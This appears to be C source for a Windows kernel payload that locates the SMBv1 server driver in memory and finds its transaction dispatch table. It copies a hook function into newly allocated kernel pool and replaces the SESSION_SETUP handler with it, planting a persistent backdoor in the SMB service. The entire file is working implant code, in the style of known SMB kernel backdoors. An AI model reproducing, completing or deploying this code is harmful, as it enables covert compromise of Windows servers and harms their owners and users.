/*
 * Copyright (c) 2020 Austin Hudson
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIEDi
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
#include <windows.h>
#include "pe_util.h"
#include "hs_util.h"
#include "winapi.h"
#include "hashes.h"

#define INDEX_SESSION_SETUP 14
//#define STATUS_INVALID_PARAMETER 0xC000000D

#define RV2OFF(Base, Rva)(((ULONG_PTR)Base) + Rva) 
#define NT_HDR(x) (PIMAGE_NT_HEADERS)\
(RV2OFF(x, ((PIMAGE_DOS_HEADER)x)->e_lfanew))

INT WindowsEntrypoint()
{
  struct Functions Func = { 0 };
  struct Drivers   Drvs = { 0 };

  Drvs.NtosKrnlBase = GetPeBase(HASH_NTOSKRNL);
  Drvs.SrvSmbv1Base = GetPeBase(HASH_SRVSMBV1);
  if (( Drvs.NtosKrnlBase != NULL ) && 
      ( Drvs.SrvSmbv1Base != NULL ) )
  {
    PIMAGE_NT_HEADERS     NtsHdr = 0;
    PIMAGE_SECTION_HEADER SecHdr = 0;

    LPVOID                SecPr1 = 0;
    LPVOID                SecPr2 = 0;
    LPVOID                OnePtr = 0;
    LPVOID                TwoPtr = 0;
    LPVOID                HckPtr = 0;
    LPVOID               *TrnTbl = 0;
    LPVOID               *TblPtr = 0;
    DWORD                 SecNm1 = 0;
    DWORD                 SecNm2 = 0;
    DWORD                 HookNm = 0;

    NtsHdr = NT_HDR(Drvs.SrvSmbv1Base);
    SecHdr = IMAGE_FIRST_SECTION(NtsHdr);

    for ( int i = 0 
    ; i < NtsHdr->FileHeader.NumberOfSections ; 
    i++ )
    {
      if ( 
        HashStringDjb2(&SecHdr[i].Name, 0) == HASH_DATA
      ) { 
        SecPr1 = (LPVOID)RV2OFF(Drvs.SrvSmbv1Base,
	  SecHdr[i].VirtualAddress); 
	SecNm1 = SecHdr[i].Misc.VirtualSize; 
      };
      if (
	HashStringDjb2(&SecHdr[i].Name, 0) == HASH_PAGE
      ) {
	SecPr2 = (LPVOID)RV2OFF(Drvs.SrvSmbv1Base,
	  SecHdr[i].VirtualAddress);
	SecNm2 = SecHdr[i].Misc.VirtualSize;
      };
    };

    TrnTbl = (LPVOID *)SecPr1;

    do {
      ULONG_PTR START_PTR  = (ULONG_PTR)SecPr2; 
      ULONG_PTR FINAL_PTR  = (ULONG_PTR)RV2OFF(SecPr2, SecNm2);
      ULONG_PTR MIDDLE_PTR = (ULONG_PTR)TrnTbl[0];

      if ( (START_PTR < MIDDLE_PTR) && (FINAL_PTR > MIDDLE_PTR) &&
	   (((ULONG_PTR)TrnTbl[18]) == 0) && 
	   (((ULONG_PTR)TrnTbl[11]) == ((ULONG_PTR)TrnTbl[12])) &&
	   (((ULONG_PTR)TrnTbl[11]) == ((ULONG_PTR)TrnTbl[9])))
      {
        TblPtr = TrnTbl; goto FoundTransactionTable;     
      };
    } while ( SecNm1-- != 0 && TrnTbl++ );

    NTSTATUS 
    SrvNotImplemented_Hook(PVOID WorkContext)
    {
      return ((SrvTransactionNotImplemented_t)0x4141414142424242)
	      (WorkContext);
    };
    VOID 
    SrvNotImplemented_Hook_End() {};

FoundTransactionTable:
    Func.ExAllocatePool = GetPeFunc(
	Drvs.NtosKrnlBase, HASH_EXALLOCATEPOOL
    );

    HookNm = (DWORD)(
	((ULONG_PTR)&SrvNotImplemented_Hook_End) - 
	((ULONG_PTR)&SrvNotImplemented_Hook));
    SecNm1 = HookNm;

    HckPtr = Func.ExAllocatePool(NonPagedPool, HookNm);
    
    OnePtr = HckPtr; TwoPtr = (LPVOID)
      &SrvNotImplemented_Hook;

    do {
      *(BYTE *)OnePtr++ = *(BYTE *)TwoPtr++;
    } while ( SecNm1-- != 0 );

    do {
      if ( *(ULONG_PTR *)OnePtr == 0x4141414142424242 ) {
        *(ULONG_PTR *)OnePtr = (ULONG_PTR)TrnTbl[INDEX_SESSION_SETUP];
      };
      OnePtr--;
    } while ( HookNm-- != 0 );

    TrnTbl[INDEX_SESSION_SETUP]    = (LPVOID)HckPtr;
  };

  return 0;
};
